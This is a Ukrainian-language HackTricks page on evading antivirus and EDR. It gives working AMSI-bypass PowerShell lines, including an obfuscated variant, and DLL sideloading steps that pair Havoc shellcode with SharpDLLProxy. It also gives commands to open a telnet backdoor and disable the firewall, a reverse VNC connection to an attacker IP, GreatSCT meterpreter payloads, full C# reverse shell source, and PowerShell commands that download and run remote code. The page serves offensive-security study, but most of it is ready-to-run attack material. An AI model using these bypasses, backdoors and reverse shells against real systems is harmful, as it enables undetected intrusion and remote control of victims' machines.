# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Цю сторінку написав** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## **Методологія ухилення від AV**

На даний момент, AV використовують різні методи для перевірки, чи є файл шкідливим, чи ні: статичне виявлення, динамічний аналіз, а для більш просунутих EDR - поведінковий аналіз.

### **Статичне виявлення**

Статичне виявлення досягається шляхом позначення відомих шкідливих рядків або масивів байтів у бінарному файлі або скрипті, а також витягування інформації з самого файлу (наприклад, опис файлу, назва компанії, цифрові підписи, іконка, контрольна сума тощо). Це означає, що використання відомих публічних інструментів може призвести до того, що вас легше спіймають, оскільки їх, ймовірно, вже проаналізували і позначили як шкідливі. Є кілька способів обійти таке виявлення:

- **Шифрування**

Якщо ви зашифруєте бінарний файл, AV не зможе виявити вашу програму, але вам знадобиться якийсь завантажувач для розшифровки та виконання програми в пам'яті.

- **Обфускація**

Іноді все, що вам потрібно зробити, це змінити кілька рядків у вашому бінарному файлі або скрипті, щоб пройти повз AV, але це може бути трудомістким завданням, залежно від того, що ви намагаєтеся обфускувати.

- **Користувацькі інструменти**

Якщо ви розробите свої власні інструменти, не буде відомих поганих підписів, але це вимагає багато часу та зусиль.

> [!NOTE]
> Хороший спосіб перевірки на статичне виявлення Windows Defender - це [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Він в основному розділяє файл на кілька сегментів, а потім просить Defender просканувати кожен з них окремо, таким чином, він може точно сказати вам, які рядки або байти були позначені у вашому бінарному файлі.

Я настійно рекомендую вам ознайомитися з цим [YouTube плейлистом](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) про практичне ухилення від AV.

### **Динамічний аналіз**

Динамічний аналіз - це коли AV запускає ваш бінарний файл у пісочниці та спостерігає за шкідливою активністю (наприклад, намагаючись розшифрувати та прочитати паролі вашого браузера, виконуючи мінідамп на LSASS тощо). Ця частина може бути трохи складнішою для роботи, але ось кілька речей, які ви можете зробити, щоб уникнути пісочниць.

- **Сон перед виконанням** Залежно від того, як це реалізовано, це може бути чудовим способом обійти динамічний аналіз AV. AV має дуже короткий час для сканування файлів, щоб не переривати робочий процес користувача, тому використання тривалих снів може порушити аналіз бінарних файлів. Проблема в тому, що багато пісочниць AV можуть просто пропустити сон, залежно від того, як це реалізовано.
- **Перевірка ресурсів машини** Зазвичай пісочниці мають дуже мало ресурсів для роботи (наприклад, < 2 ГБ ОП), інакше вони можуть сповільнити машину користувача. Ви також можете бути дуже креативними тут, наприклад, перевіряючи температуру ЦП або навіть швидкість вентиляторів, не все буде реалізовано в пісочниці.
- **Перевірки, специфічні для машини** Якщо ви хочете націлитися на користувача, чия робоча станція приєднана до домену "contoso.local", ви можете перевірити домен комп'ютера, щоб дізнатися, чи відповідає він вказаному вами, якщо ні, ви можете змусити свою програму вийти.

Виявляється, що ім'я комп'ютера пісочниці Microsoft Defender - HAL9TH, тому ви можете перевірити ім'я комп'ютера у вашому шкідливому ПЗ перед детонацією, якщо ім'я відповідає HAL9TH, це означає, що ви всередині пісочниці Defender, тому ви можете змусити свою програму вийти.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>джерело: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Деякі інші дійсно хороші поради від [@mgeeky](https://twitter.com/mariuszbit) для боротьби з пісочницями

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev канал</p></figcaption></figure>

Як ми вже говорили раніше в цьому пості, **публічні інструменти** врешті-решт **будуть виявлені**, тому вам слід запитати себе щось:

Наприклад, якщо ви хочете скинути LSASS, **чи дійсно вам потрібно використовувати mimikatz**? Чи можете ви використовувати інший проект, який менш відомий і також скидає LSASS.

Правильна відповідь, ймовірно, остання. Взяти mimikatz як приклад, це, ймовірно, один з, якщо не найбільш позначених шкідливих програм AV та EDR, хоча сам проект дуже класний, з ним також важко працювати, щоб обійти AV, тому просто шукайте альтернативи для того, що ви намагаєтеся досягти.

> [!NOTE]
> Коли ви модифікуєте свої вантажі для ухилення, переконайтеся, що ви **вимкнули автоматичну подачу зразків** в Defender, і, будь ласка, серйозно, **НЕ ЗАВАНТАЖУЙТЕ НА VIRUSTOTAL**, якщо ваша мета - досягти ухилення в довгостроковій перспективі. Якщо ви хочете перевірити, чи виявляє ваш вантаж певний AV, встановіть його на віртуальну машину, спробуйте вимкнути автоматичну подачу зразків і протестуйте його там, поки не будете задоволені результатом.

## EXEs проти DLLs

Коли це можливо, завжди **надавайте перевагу використанню DLL для ухилення**, на мій погляд, файли DLL зазвичай **значно менше виявляються** та аналізуються, тому це дуже простий трюк, який можна використовувати, щоб уникнути виявлення в деяких випадках (якщо ваш вантаж має якийсь спосіб виконання як DLL, звичайно).

Як ми можемо бачити на цьому зображенні, вантаж DLL з Havoc має рівень виявлення 4/26 на antiscan.me, тоді як вантаж EXE має рівень виявлення 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>порівняння вантажу звичайного Havoc EXE з вантажем звичайного Havoc DLL на antiscan.me</p></figcaption></figure>

Тепер ми покажемо кілька трюків, які ви можете використовувати з файлами DLL, щоб бути набагато непомітнішими.

## Завантаження DLL та проксування

**Завантаження DLL** використовує порядок пошуку DLL, що використовується завантажувачем, розміщуючи як жертву, так і шкідливі вантажі поруч один з одним.

Ви можете перевірити програми, які підлягають завантаженню DLL, використовуючи [Siofra](https://github.com/Cybereason/siofra) та наступний скрипт PowerShell:
```powershell
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Ця команда виведе список програм, які підлягають DLL hijacking у "C:\Program Files\\" та DLL файли, які вони намагаються завантажити.

Я настійно рекомендую вам **самостійно дослідити програми, які можна піддати DLL Hijackable/Sideloadable**, ця техніка досить непомітна, якщо її правильно виконати, але якщо ви використовуєте публічно відомі програми DLL Sideloadable, вас можуть легко спіймати.

Просто розміщення шкідливого DLL з ім'ям, яке програма очікує завантажити, не завантажить ваш вантаж, оскільки програма очікує деякі специфічні функції всередині цього DLL, щоб вирішити цю проблему, ми використаємо іншу техніку, звану **DLL Proxying/Forwarding**.

**DLL Proxying** пересилає виклики, які програма робить з проксі (і шкідливого) DLL до оригінального DLL, таким чином зберігаючи функціональність програми та здатність обробляти виконання вашого вантажу.

Я буду використовувати проект [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) від [@flangvik](https://twitter.com/Flangvik/)

Це кроки, які я виконав:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Остання команда надасть нам 2 файли: шаблон вихідного коду DLL та оригінальну перейменовану DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Це результати:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Обидва наші shellcode (закодовані за допомогою [SGN](https://github.com/EgeBalci/sgn)) та проксі DLL мають 0/26 рівень виявлення на [antiscan.me](https://antiscan.me)! Я б назвав це успіхом.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> Я **щиро рекомендую** вам подивитися [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) про DLL Sideloading, а також [відео ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE), щоб дізнатися більше про те, що ми обговорювали більш детально.

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze - це набір інструментів для обходу EDR, використовуючи призупинені процеси, прямі системні виклики та альтернативні методи виконання`

Ви можете використовувати Freeze для завантаження та виконання вашого shellcode у прихований спосіб.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> Уникнення - це просто гра в кішки-мишки, те, що працює сьогодні, може бути виявлено завтра, тому ніколи не покладайтеся лише на один інструмент, якщо це можливо, спробуйте поєднати кілька технік уникнення.

## AMSI (Інтерфейс сканування антивірусного програмного забезпечення)

AMSI був створений для запобігання "[безфайловому шкідливому ПЗ](https://en.wikipedia.org/wiki/Fileless_malware)". Спочатку антивірусні програми могли лише сканувати **файли на диску**, тому, якщо ви могли якимось чином виконати корисне навантаження **безпосередньо в пам'яті**, антивірус не міг нічого зробити, щоб цьому запобігти, оскільки у нього не було достатньої видимості.

Функція AMSI інтегрована в ці компоненти Windows.

- Контроль облікових записів користувачів, або UAC (підвищення прав для EXE, COM, MSI або установки ActiveX)
- PowerShell (скрипти, інтерактивне використання та динамічна оцінка коду)
- Windows Script Host (wscript.exe та cscript.exe)
- JavaScript та VBScript
- Макроси Office VBA

Це дозволяє антивірусним рішенням перевіряти поведінку скриптів, відкриваючи вміст скриптів у формі, яка є як незашифрованою, так і не заплутаною.

Виконання `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` викличе наступне сповіщення в Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Зверніть увагу, як передує `amsi:` і потім шлях до виконуваного файлу, з якого запустився скрипт, у цьому випадку, powershell.exe

Ми не скинули жодного файлу на диск, але все ж були спіймані в пам'яті через AMSI.

Є кілька способів обійти AMSI:

- **Обфускація**

Оскільки AMSI в основному працює з статичними виявленнями, тому модифікація скриптів, які ви намагаєтеся завантажити, може бути хорошим способом уникнути виявлення.

Однак AMSI має можливість розшифровувати скрипти, навіть якщо у них є кілька шарів, тому обфускація може бути поганим варіантом залежно від того, як це зроблено. Це ускладнює уникнення. Хоча іноді все, що вам потрібно зробити, це змінити кілька імен змінних, і ви будете в порядку, тому це залежить від того, наскільки щось було позначено.

- **Обхід AMSI**

Оскільки AMSI реалізується шляхом завантаження DLL у процес PowerShell (також cscript.exe, wscript.exe тощо), його можна легко підробити, навіть працюючи як неправа користувач. Через цей недолік у реалізації AMSI дослідники знайшли кілька способів уникнути сканування AMSI.

**Примусова помилка**

Примусове завершення ініціалізації AMSI (amsiInitFailed) призведе до того, що для поточного процесу не буде ініційовано жодного сканування. Спочатку це було розкрито [Matt Graeber](https://twitter.com/mattifestation), і Microsoft розробила підпис, щоб запобігти більш широкому використанню.
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Все, що було потрібно, це один рядок коду PowerShell, щоб зробити AMSI непридатним для поточного процесу PowerShell. Цей рядок, звичайно, був позначений самим AMSI, тому потрібні деякі модифікації, щоб використовувати цю техніку.

Ось модифікований AMSI bypass, який я взяв з цього [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```powershell
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Зверніть увагу, що це, ймовірно, буде позначено, як тільки цей пост вийде, тому вам не слід публікувати жоден код, якщо ваш план полягає в тому, щоб залишитися непоміченим.

**Memory Patching**

Цю техніку спочатку виявив [@RastaMouse](https://twitter.com/_RastaMouse/), і вона полягає у знаходженні адреси функції "AmsiScanBuffer" в amsi.dll (відповідальної за сканування введених користувачем даних) та переписуванні її інструкціями, щоб повернути код для E_INVALIDARG, таким чином результат фактичного сканування поверне 0, що інтерпретується як чистий результат.

> [!NOTE]
> Будь ласка, прочитайте [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) для більш детального пояснення.

Існує також багато інших технік, які використовуються для обходу AMSI за допомогою powershell, ознайомтеся з [**цією сторінкою**](basic-powershell-for-pentesters/#amsi-bypass) та [цим репозиторієм](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell), щоб дізнатися більше про них.

Або цей скрипт, який через пам'яткове патчування буде патчити кожен новий Powersh

## Obfuscation

Існує кілька інструментів, які можна використовувати для **обфускації C# коду у відкритому тексті**, генерування **метапрограмних шаблонів** для компіляції бінарних файлів або **обфускації скомпільованих бінарних файлів**, таких як:

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# обфускатор**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Метою цього проекту є надання відкритого коду форка [LLVM](http://www.llvm.org/) компіляційного пакету, здатного забезпечити підвищену безпеку програмного забезпечення через [обфускацію коду](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) та захист від підробки.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator демонструє, як використовувати мову `C++11/14` для генерації, під час компіляції, обфускованого коду без використання будь-якого зовнішнього інструменту та без модифікації компілятора.
- [**obfy**](https://github.com/fritzone/obfy): Додає шар обфускованих операцій, згенерованих за допомогою шаблонного метапрограмування C++, що ускладнить життя людині, яка хоче зламати додаток.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz - це обфускатор бінарних файлів x64, здатний обфускувати різні файли pe, включаючи: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame - це простий метаморфний кодовий двигун для довільних виконуваних файлів.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator - це детальний фреймворк обфускації коду для мов, що підтримуються LLVM, з використанням ROP (програмування, орієнтованого на повернення). ROPfuscator обфускує програму на рівні асемблерного коду, перетворюючи звичайні інструкції на ROP-ланцюги, що заважає нашому природному сприйняттю нормального потоку управління.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt - це .NET PE Crypter, написаний на Nim.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor здатний перетворювати існуючі EXE/DLL у shellcode, а потім завантажувати їх.

## SmartScreen & MoTW

Ви, можливо, бачили цей екран, коли завантажували деякі виконувані файли з Інтернету та виконували їх.

Microsoft Defender SmartScreen - це механізм безпеки, призначений для захисту кінцевого користувача від запуску потенційно шкідливих додатків.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen в основному працює на основі репутації, що означає, що незвичайно завантажені програми викликають SmartScreen, тим самим попереджаючи та заважаючи кінцевому користувачу виконувати файл (хоча файл все ще можна виконати, натиснувши Більше інформації -> Запустити все ж).

**MoTW** (Mark of The Web) - це [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) з назвою Zone.Identifier, який автоматично створюється під час завантаження файлів з Інтернету разом з URL-адресою, з якої він був завантажений.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Перевірка Zone.Identifier ADS для файлу, завантаженого з Інтернету.</p></figcaption></figure>

> [!NOTE]
> Важливо зазначити, що виконувані файли, підписані **достовірним** сертифікатом підпису, **не викликають SmartScreen**.

Дуже ефективний спосіб запобігти тому, щоб ваші корисні навантаження отримали Mark of The Web, - це упакувати їх у якийсь контейнер, наприклад, ISO. Це відбувається тому, що Mark-of-the-Web (MOTW) **не може** бути застосований до **не NTFS** томів.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) - це інструмент, який упакує корисні навантаження в вихідні контейнери, щоб уникнути Mark-of-the-Web.

Приклад використання:
```powershell
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Ось демонстрація обходу SmartScreen шляхом упаковки payload у файли ISO за допомогою [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## Відображення збірки C#

Завантаження бінарних файлів C# в пам'ять відомо вже досить давно, і це все ще дуже хороший спосіб запуску ваших інструментів після експлуатації без виявлення антивірусом.

Оскільки payload буде завантажено безпосередньо в пам'ять без доступу до диска, нам потрібно буде лише подбати про патчинг AMSI для всього процесу.

Більшість C2 фреймворків (sliver, Covenant, metasploit, CobaltStrike, Havoc тощо) вже надають можливість виконувати збірки C# безпосередньо в пам'яті, але є різні способи це зробити:

- **Fork\&Run**

Це передбачає **створення нового жертвеного процесу**, ін'єкцію вашого шкідливого коду після експлуатації в цей новий процес, виконання вашого шкідливого коду, а коли закінчите, завершення нового процесу. Це має свої переваги та недоліки. Перевага методу fork and run полягає в тому, що виконання відбувається **ззовні** нашого процесу Beacon implant. Це означає, що якщо щось у нашій дії після експлуатації піде не так або буде виявлено, є **набагато більша ймовірність** того, що наш **імплант виживе.** Недолік полягає в тому, що у вас є **більша ймовірність** бути виявленим за допомогою **поведінкових детекцій**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Це про ін'єкцію шкідливого коду після експлуатації **в його власний процес**. Таким чином, ви можете уникнути створення нового процесу та його сканування антивірусом, але недолік полягає в тому, що якщо щось піде не так з виконанням вашого payload, є **набагато більша ймовірність** **втрати вашого beacon**, оскільки він може зламатися.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> Якщо ви хочете дізнатися більше про завантаження збірок C#, будь ласка, ознайомтеся з цією статтею [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) та їх BOF InlineExecute-Assembly ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Ви також можете завантажувати збірки C# **з PowerShell**, ознайомтеся з [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) та [відео S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Використання інших мов програмування

Як пропонується в [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), можливо виконувати шкідливий код, використовуючи інші мови, надаючи скомпрометованій машині доступ **до середовища інтерпретатора, встановленого на SMB-ресурсі, контрольованому зловмисником**.

Дозволяючи доступ до бінарних файлів інтерпретатора та середовища на SMB-ресурсі, ви можете **виконувати довільний код на цих мовах в пам'яті** скомпрометованої машини.

Репозиторій вказує: Defender все ще сканує скрипти, але, використовуючи Go, Java, PHP тощо, ми маємо **більшу гнучкість для обходу статичних підписів**. Тестування випадкових не обфусцированих реверс-shell скриптів на цих мовах виявилося успішним.

## Розширене ухилення

Ухилення - це дуже складна тема, іноді потрібно враховувати багато різних джерел телеметрії в одній системі, тому практично неможливо залишатися повністю непоміченим у зрілих середовищах.

Кожне середовище, з яким ви стикаєтеся, матиме свої власні сильні та слабкі сторони.

Я настійно рекомендую вам подивитися цю доповідь від [@ATTL4S](https://twitter.com/DaniLJ94), щоб отримати уявлення про більш розширені техніки ухилення.

{% embed url="https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo" %}

Це також ще одна чудова доповідь від [@mariuszbit](https://twitter.com/mariuszbit) про ухилення в глибині.

{% embed url="https://www.youtube.com/watch?v=IbA7Ung39o4" %}

## **Старі техніки**

### **Перевірте, які частини Defender вважає шкідливими**

Ви можете використовувати [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), який **видалить частини бінарного файлу**, поки не **з'ясує, яка частина Defender** вважає шкідливою, і розділить це для вас.\
Інший інструмент, який робить **те саме, це** [**avred**](https://github.com/dobin/avred) з відкритим веб-сайтом, що пропонує послугу на [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

До Windows 10 всі Windows постачалися з **Telnet сервером**, який ви могли встановити (як адміністратор), виконавши:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Зробіть так, щоб він **запускався** при старті системи та **виконайте** його зараз:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Змінити порт telnet** (приховано) та вимкнути брандмауер:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Завантажте його з: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (вам потрібні бінарні завантаження, а не налаштування)

**НА ХОСТІ**: Виконайте _**winvnc.exe**_ і налаштуйте сервер:

- Увімкніть опцію _Disable TrayIcon_
- Встановіть пароль у _VNC Password_
- Встановіть пароль у _View-Only Password_

Потім перемістіть бінарний файл _**winvnc.exe**_ і **новостворений** файл _**UltraVNC.ini**_ всередину **жертви**

#### **Зворотне з'єднання**

**Атакуючий** повинен **виконати всередині** свого **хоста** бінарний файл `vncviewer.exe -listen 5900`, щоб він був **готовий** прийняти зворотне **VNC з'єднання**. Потім, всередині **жертви**: Запустіть демон winvnc `winvnc.exe -run` і виконайте `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ПОПЕРЕДЖЕННЯ:** Щоб зберегти непомітність, ви не повинні робити кілька речей

- Не запускайте `winvnc`, якщо він вже працює, або ви викличете [вікно сповіщення](https://i.imgur.com/1SROTTl.png). перевірте, чи він працює за допомогою `tasklist | findstr winvnc`
- Не запускайте `winvnc` без `UltraVNC.ini` в тій же директорії, інакше відкриється [вікно конфігурації](https://i.imgur.com/rfMQWcf.png)
- Не запускайте `winvnc -h` для отримання допомоги, або ви викличете [вікно сповіщення](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Завантажте його з: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Всередині GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Тепер **почніть лістер** з `msfconsole -r file.rc` і **виконайте** **xml payload** з:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Поточний захисник дуже швидко завершить процес.**

### Компіляція нашого власного реверс-шеллу

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Перший C# реверс-шелл

Скомпілюйте його за допомогою:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Використовуйте це з:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# використовуючи компілятор
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
Автоматичне завантаження та виконання:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{% embed url="https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f" %}

Список обфускаторів C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Використання python для прикладу створення інжекторів:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Інші інструменти
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
